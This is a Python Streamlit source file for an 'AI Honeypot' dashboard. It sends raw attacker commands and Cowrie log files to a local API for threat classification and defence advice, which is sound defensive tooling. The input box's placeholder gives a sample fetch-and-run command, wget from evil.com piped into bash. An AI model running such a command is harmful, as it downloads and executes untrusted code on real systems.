import streamlit as st
import requests
import json
import time

API_URL = "http://localhost:8002"  # FastAPI base URL

st.set_page_config(
    page_title="Threat Nexus - AI Honeypot",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# Custom CSS for Premium Dark Mode & Glassmorphism
st.markdown("""
<style>
    /* Import Google Fonts */
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap');

    /* Base Styling */
    html, body, [class*="css"] {
        font-family: 'Outfit', sans-serif;
        background-color: #0b0f19;
        color: #e2e8f0;
    }
    
    /* Headers */
    h1 {
        font-weight: 800;
        background: -webkit-linear-gradient(45deg, #3b82f6, #8b5cf6, #ec4899);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 0.5rem;
    }
    h2, h3 {
        font-weight: 600;
        color: #f8fafc;
    }

    /* Glassmorphism Cards */
    div[data-testid="stExpander"], div.stTextArea > div > div > textarea {
        background: rgba(15, 23, 42, 0.6) !important;
        backdrop-filter: blur(12px) !important;
        -webkit-backdrop-filter: blur(12px) !important;
        border: 1px solid rgba(255, 255, 255, 0.08) !important;
        border-radius: 12px !important;
        color: #e2e8f0 !important;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3) !important;
        transition: all 0.3s ease;
    }
    
    /* Code Blocks */
    code, pre {
        font-family: 'JetBrains Mono', monospace !important;
        background-color: rgba(0, 0, 0, 0.4) !important;
        border-radius: 8px !important;
        border: 1px solid rgba(255, 255, 255, 0.05) !important;
    }

    /* Buttons */
    div.stButton > button {
        background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%) !important;
        color: white !important;
        font-weight: 600 !important;
        border: none !important;
        border-radius: 8px !important;
        padding: 0.5rem 2rem !important;
        transition: opacity 0.3s ease, transform 0.2s ease !important;
        box-shadow: 0 4px 14px 0 rgba(139, 92, 246, 0.39) !important;
    }
    div.stButton > button:hover {
        opacity: 0.9 !important;
        transform: translateY(-2px) !important;
    }

    /* Alerts / Infos */
    div[data-testid="stAlert"] {
        background: rgba(30, 41, 59, 0.7) !important;
        border: 1px solid rgba(255,255,255,0.1) !important;
        border-radius: 10px !important;
        color: #f1f5f9 !important;
    }
    
    /* Upload Box */
    .stFileUploader > div > div {
        background: rgba(15, 23, 42, 0.6) !important;
        border: 1px dashed rgba(139, 92, 246, 0.5) !important;
        border-radius: 12px !important;
    }

    /* Progress bar */
    .stProgress > div > div > div > div {
        background: linear-gradient(90deg, #3b82f6, #ec4899) !important;
    }
</style>
""", unsafe_allow_html=True)

st.title("AI Honeypot Log Classification")
st.caption("AI-Driven Log Classification and suggestions")
st.markdown("---")

col1, col2 = st.columns([1, 1], gap="large")

with col1:
    # -------------------------
    # SECTION 1 — Manual Log Test
    # -------------------------
    st.subheader("🔍 Analyze Raw Log")
    log_input = st.text_area(
        "Enter raw attacker instruction or honeypot log",
        placeholder="e.g. wget http://evil.com/payload.sh && bash payload.sh",
        height=150
    )

    if st.button("Evaluate Threat", use_container_width=True):
        if not log_input.strip():
            st.warning("Please provide a log entry.")
        else:
            with st.spinner("Analyzing threat vectors..."):
                try:
                    res = requests.post(f"{API_URL}/classify", json={"log": log_input})
                    if res.status_code == 200:
                        data = res.json()
                        st.markdown(f"### 🚨 Vector: `{data['attack_type'].upper().replace('_', ' ')}`")
                        st.info(f"**Intelligence Summary:**\n{data['summary']}")
                        st.success("**Tactical Defense Plan:**\n" + "\n".join([f"- {r}" for r in data["recommendations"]]))
                    else:
                        st.error("API Error. Ensure FastAPI is running.")
                except Exception as e:
                    st.error(f"Connection Failed: {e}")

with col2:
    # -----------------------------------
    # SECTION 2 — Upload Cowrie JSON logs
    # -----------------------------------
    st.subheader("Batch Intake (Cowrie Logs)")
    cowrie_file = st.file_uploader("Upload .jsonl from Cowrie", type=["json", "jsonl"])

    if cowrie_file:
        if st.button("Initialize Batch Analysis", use_container_width=True):
            logs = []
            for line in cowrie_file.readlines():
                try:
                    logs.append(json.loads(line))
                except:
                    pass

            st.write(f"Parsed **{len(logs)}** events. Initiating scan...")
            results = []
            prog_bar = st.progress(0)

            for i, entry in enumerate(logs):
                cmd = entry.get("input", "")
                if cmd:
                    try:
                        res = requests.post(f"{API_URL}/ingest/cowrie", json=entry)
                        if res.status_code == 200:
                            results.append(res.json())
                    except:
                        pass
                prog_bar.progress((i + 1) / len(logs))

            st.success("Batch Analysis Concluded.")

            for r_batch in results:
                # API returns list if sent to generic endpoint or list of results
                results_list = r_batch.get("results", [r_batch]) if isinstance(r_batch, dict) else [r_batch]
                
                for r in results_list:
                    cmd_extracted = r.get("extracted_command") or "<no command>"
                    label = r.get("attack_type", "<unknown>")
                    
                    with st.expander(f"🔴 [{label}] - {cmd_extracted[:40]}..."):
                        st.markdown(f"**Command:** `{cmd_extracted}`")
                        st.info(r.get("summary", "No summary"))
                        recs = r.get("recommendations", [])
                        if recs:
                            st.success("\n".join([f"- {x}" for x in recs]))

